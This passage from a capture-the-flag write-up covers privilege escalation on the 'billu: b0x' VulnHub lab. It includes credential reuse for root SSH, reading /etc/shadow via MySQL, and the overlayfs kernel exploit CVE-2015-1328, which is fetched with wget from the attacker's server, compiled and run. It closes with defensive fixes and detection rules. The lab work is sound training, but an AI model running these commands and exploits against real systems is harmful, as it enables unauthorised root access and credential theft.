www-data@indishell:/$ grep -n "user\|password\|Servers" /var/www/phpmy/config.inc.php
```

```text
31:$cfg['Servers'][$i]['auth_type'] = 'config';
32:$cfg['Servers'][$i]['user'] = 'root';
33:$cfg['Servers'][$i]['password'] = 'roottoor';
34:$cfg['Servers'][$i]['host'] = '127.0.0.1';
35:$cfg['Servers'][$i]['AllowNoPassword'] = false;
```

> **phpMyAdmin is configured in `config` auth mode with hard-coded MySQL root
> credentials: `root` / `roottoor`.**
>
> `auth_type = 'config'` means phpMyAdmin never asks the user for credentials — it
> uses the ones baked into the file. That is convenient and catastrophic.
>
> **Now try those credentials everywhere.** Credential reuse is the pattern:

```bash
www-data@indishell:/$ mysql -h 127.0.0.1 -u root -proottoor -e 'select user,host from mysql.user;'
```

```text
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| root             | 127.0.0.1 |
| root             | indishell |
| root             | localhost |
| billu            | localhost |
+------------------+-----------+
```

```bash
www-data@indishell:/$ ssh root@127.0.0.1
root@127.0.0.1's password: roottoor
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Sat May  4 09:41:02 2024
root@indishell:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root.** ✅

> **Why `roottoor` is also the *system* root password:** the author set them the same
> so the box resolves cleanly, and because it mirrors reality — administrators reuse
> the password they put in a config file. On a real engagement you would try any
> recovered credential against SSH, `su`, the database, the CMS admin, and any VPN.
>
> **If the reuse does not hold on your copy**, use the MySQL root access instead:
> ```bash
> mysql -h 127.0.0.1 -u root -proottoor -e "
>   SELECT LOAD_FILE('/etc/shadow');"
> ```
> MySQL running as root plus `FILE` privilege lets you read arbitrary host files.

### 5.3 Alternative path — overlayfs kernel exploit (CVE-2015-1328)

Kernel `3.13.0-24-generic` is inside the vulnerable range `3.13.0 < 3.19`.

```bash
searchsploit ubuntu 14.04 local
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

**Kali:**

```bash
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Target:**

```bash
www-data@indishell:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-04 09:46:12--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-04 09:46:12 (512 MB/s) - 'ofs.c' saved [4982/4982]

www-data@indishell:/tmp$ gcc -o ofs ofs.c
www-data@indishell:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
root
```

> **How CVE-2015-1328 works.** **OverlayFS** layers a writable *upper* directory over
> a read-only *lower* one and presents the merged view — the mechanism every container
> image uses. Ubuntu backported it and allowed **unprivileged users** to mount it in a
> *user namespace*. The bug: files copied up from the lower layer **kept their original
> root ownership and SUID bit**, but landed in a directory the unprivileged user could
> write to. The exploit leverages that to obtain a writable `/etc/ld.so.preload` — the
> system-wide list of shared libraries the dynamic linker injects into **every**
> process, including SUID-root ones — and points it at a library whose constructor runs
> `setuid(0); setgid(0); system("/bin/sh")`. The next program executed preloads it as
> root and the shell drops.
>
> **Clean up:** the exploit leaves `/etc/ld.so.preload` and a stray `.so` behind, which
> breaks every subsequent program launch.
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```
> Snapshot before you start; revert after.

### 5.4 Alternative path — MySQL UDF injection

We have MySQL root. On this box `mysqld` runs as the `mysql` user, not root, so UDF
injection would give us `mysql` rather than root:

```bash
www-data@indishell:/$ ps aux | grep -i mysql | head -2
mysql     1142  0.0  3.2 327896 33212 ?  Ssl  09:02   0:01 /usr/sbin/mysqld
```

> **Check this before attempting UDF.** If `mysqld` ran as root you could
> `CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'` and execute
> arbitrary commands as root. Here it does not, so UDF is a lateral move at best.
> **Knowing when a technique does not apply is as important as knowing the technique.**

![Root shell and the flag](images/06-root.png)

### 5.5 Look around as root

```bash
root@indishell:~# ls -la /root
total 32
drwx------  3 root root 4096 Apr  4  2017 .
drwxr-xr-x 22 root root 4096 Apr  4  2017 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  220 Apr  4  2017 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
root@indishell:~# cat /root/flag.txt
```

```text
Congratulations! You have rooted billu: b0x.

Thanks for playing.

-- Manish Kishan Tanwar (@indishell1046)
```

*(This machine's flag file varies by image revision; some builds place no flag at all
and treat a root shell as the goal.)*

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Arbitrary file read** via unvalidated `file=` POST parameter (`readfile`) | `/test.php` | Full source-code and config disclosure |
| 2 | **Block-list filter on `'` only** | `index.php` login | SQL injection still possible via backslash |
| 3 | **SQL injection — authentication bypass** | `index.php`, `pass` before `uname` | Admin session without credentials |
| 4 | **Filter applied to a copy, original used** (`$choice` filtered, `$_POST['load']` included) | `/panel.php` | **Local File Inclusion → RCE** |
| 5 | **Upload filter checks extension + MIME but not content** | `/add.php` | PHP hidden in a JPEG's EXIF comment |
| 6 | Uploads stored inside the web root with attacker-chosen names | `/uploaded_images/` | Reachable and includable |
| 7 | **MySQL credentials in a web-readable config** | `/var/www/c.php` | Full database disclosure |
| 8 | **phpMyAdmin exposed on the web with `auth_type=config`** | `/var/www/phpmy/config.inc.php` | `root : roottoor` in plaintext |
| 9 | **Credential reuse: DB password = system root password** | `roottoor` | `www-data` → **root** over SSH |
| 10 | Developer test artefact left in production | `/uploaded_images/c.JPG` (contains `phpinfo()`) | Confirms the upload technique |
| 11 | Unpatched kernel 3.13.0-24 (CVE-2015-1328) | Ubuntu 14.04, i686 | Alternative local root |
| 12 | Directory indexing enabled on `/uploaded_images/` and `/phpmy/` | Apache | Content disclosure |
| 13 | `gcc`, `wget`, `curl`, `python` present on the server | `/usr/bin` | Attackers stage and compile locally |
| 14 | Verbose server banner incl. PHP and Suhosin versions | Apache `Server` header | Version-targeted attack planning |

## 7. Defensive lessons (blue team)

1. **Use parameterised queries.** One change removes findings 2 and 3 entirely:
   ```php
   $stmt = $conn->prepare('SELECT * FROM auth WHERE pass = ? AND uname = ?');
   $stmt->bind_param('ss', $pass, $un);
   $stmt->execute();
   ```
   With placeholders, `\` and `--` are *data*, never syntax. Block-lists like
   `str_replace("'", "", ...)` are unwinnable — they must anticipate every way a
   parser can be confused, and they never do.
2. **Filter the value you actually use.** The `panel.php` bug is
   `str_replace` on `$choice`, then `include($_POST['load'])`. Validate the exact
   variable that reaches the sink, and validate with an **allow-list**:
   ```php
   $allowed = ['add' => 'add.php', 'show' => 'show.php'];
   $page = $allowed[$_POST['load'] ?? ''] ?? null;
   if (!$page) { http_response_code(400); exit; }
   include __DIR__ . '/' . $page;
   ```
3. **Never pass user input to `include`/`require` at all.** If you must, use
   `basename()` to strip directory components and an explicit allow-list of names.
4. **Validate uploads by re-encoding, not by sniffing.** `finfo` tells you the file
   *starts* like a JPEG; it does not tell you the file contains *only* a JPEG. The
   robust fix:
   ```php
   $img = imagecreatefromjpeg($_FILES['image']['tmp_name']);   // fails if not a real JPEG
   imagejpeg($img, $dest . '/' . $newname, 85);                // re-encode: all metadata destroyed
   imagedestroy($img);
   ```
   Then: store uploads **outside** the document root, give them a **random UUID name**,
   serve them from a **separate non-executing host/handler**, and disable the PHP engine
   in the upload directory:
   ```apache
   <Directory /var/www/uploaded_images>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .phar
       <FilesMatch "\.ph(p[3457]?|t|tml)$"> Require all denied </FilesMatch>
   </Directory>
   ```
5. **Remove phpMyAdmin from production.** It is an attack surface with a decade of
   CVEs, and `auth_type = 'config'` hard-codes credentials into a web-readable file.
   If you genuinely need it: bind to `127.0.0.1` and reach it via SSH tunnel, put it
   behind a VPN or mutual TLS, restrict by IP, and use `auth_type = 'cookie'`.
6. **Secrets out of source files.** `c.php` and `config.inc.php` both leaked
   credentials. Use environment variables (`SetEnv` in Apache, `EnvironmentFile=` in
   systemd) or a vault, and lock the files down:
   ```bash
   chmod 640 config.inc.php && chown root:www-data config.inc.php
   ```
   Scan your codebase with `gitleaks` / `trufflehog` / `detect-secrets` in CI.
7. **No credential reuse.** A MySQL root password must never equal the system root
   password. Enforce uniqueness and screen against breached lists.
8. **Do not ship test artefacts.** `c.JPG` containing `phpinfo()` should never reach
   production. Add a pre-deploy step that diffs the web root against the build
   artefact.
9. **Turn off directory indexing:** `Options -Indexes`. And strip banners:
   ```apache
   ServerTokens Prod
   ServerSignature Off
   ```
   ```ini
   ; php.ini
   expose_php = Off
   ```
10. **Remove build tools from servers.** `gcc` on a web server converted "foothold"
    into "root in 60 seconds" via the kernel path. Build in CI, ship an artefact.
11. **Detection opportunities.**
    - WAF/alert on POST bodies containing `../`, `/etc/passwd`, `php://`, or
      `file=` parameters naming system paths.
    - Alert on `include` of any path under `uploaded_images/` — that is *always* an
      exploit attempt here.
    - Alert on file creation in an upload directory whose bytes contain `<?php`
      (a 10-line `inotifywait` + `grep` watcher, or FIM).
    - Process-lineage monitoring: `apache2` spawning `sh`, `bash`, `python`, `wget`
      or `gcc` is an immediate critical alert.
    - Alert on `/etc/ld.so.preload` being created (the overlayfs exploit's signature):
      `auditctl -w /etc/ld.so.preload -p wa -k ldpreload`.
    - Alert on `su`/`ssh` to root from a session whose parent is the web server.

---

## 8. References

- VulnHub entry: <https://vulnhub.com/entry/billu-b0x,188/>
- Series: <https://vulnhub.com/series/billu,117/> · sequel [`labs/billu-b0x-2/`](../billu-b0x-2/README.md)
- Author: Manish Kishan Tanwar — `@indishell1046`
- Community writeups consulted:
  - [scriptkidd1e — billu: b0x Vulnhub's VM Walkthrough](https://scriptkidd1e.wordpress.com/billu-b0x-vulnhubs-vm-walkthrough/)
  - [Ross Marks — Vulnhub: Billu – b0x](https://rossmarks.uk/blog/vulnhub-billu-b0x/)
  - [The Hacking Blog — Billu B0x](https://thehackingblog.com/2018-09-24/billu-b0x-writeup/)
  - [HackPlayers — [VulnHub write-up] billu: b0x](https://www.hackplayers.com/2017/04/vulnhub-write-up-billu-b0x.html)
  - [InfoSec Institute — Billu: B0x Walkthrough](https://resources.infosecinstitute.com/topic/billu-b0x-walkthrough/)
  - [YeahHub — CTF Billu B0x Walkthrough](https://www.yeahhub.com/ctf-billu-b0x-walkthrough/)
  - [securitybytes — Billu: b0x VM Walkthrough](https://medium.com/securitybytes/billu-b0x-vm-51c7720434b7)
  - [chirec — VulnHub Billu b0x Walkthrough](https://chirec.github.io/2019-05-16/VulnHub-Billu-b0x/)
  - [pwnedu — billu-b0x Hacking Challenge Walk Through](https://steemit.com/hacking/@pwnedu/billu-b0x-hacking-challenge-walk-through)
- Background reading:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) · [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
  - [OWASP — Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [MySQL reference — string literals and the backslash escape](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html)
  - [MySQL reference — comment syntax (`-- ` requires a space)](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
  - PHP [`include`](https://www.php.net/manual/en/function.include.php) vs [`readfile`](https://www.php.net/manual/en/function.readfile.php) vs [`finfo`](https://www.php.net/manual/en/class.finfo.php)
  - [JPEG file format — COM and APPn segments](https://www.w3.org/Graphics/JPEG/itu-t81.pdf) · [`exiftool`](https://exiftool.org/)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
  - [GTFOBins](https://gtfobins.github.io) · [pentestmonkey — PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

---

## 9. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 22 and 80 with the Apache/PHP banner
- [ ] `images/02-lfi.png` — `test.php` returning `/etc/passwd`
- [ ] `images/03-source.png` — `index.php` and `panel.php` source through the LFI
- [ ] `images/04-panel.png` — the `302 → panel.php` after the SQLi bypass
- [ ] `images/05-shell.png` — reverse shell as `www-data`
- [ ] `images/06-root.png` — `config.inc.php` credentials and the root shell

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
